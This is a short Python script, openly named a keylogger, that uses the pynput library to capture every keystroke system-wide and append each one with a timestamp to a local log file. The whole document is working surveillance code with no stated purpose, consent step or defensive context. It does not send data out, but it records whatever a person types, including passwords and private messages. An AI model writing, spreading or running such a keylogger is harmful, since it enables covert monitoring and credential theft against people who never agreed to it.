from pynput import keyboard
import datetime
import os

#This is to ensure that the directory exists.
log_file_path = "keylogger/log.txt"
os.makedirs(os.path.dirname(log_file_path), exist_ok=True)

#This is to callback thr function to execute on every keypress.
def on_press(key):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        #For printable characters
        key_str = key.char
    except AttributeError:
        #For special keys (space, enter, etc.)
        key_str = str(key)

    log_entry = f"{timestamp} - {key_str}\n"

    #Append to log.txt
    with open(log_file_path, "a") as log_file:
        log_file.write(log_entry)
    
#Start listening for keystrokes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()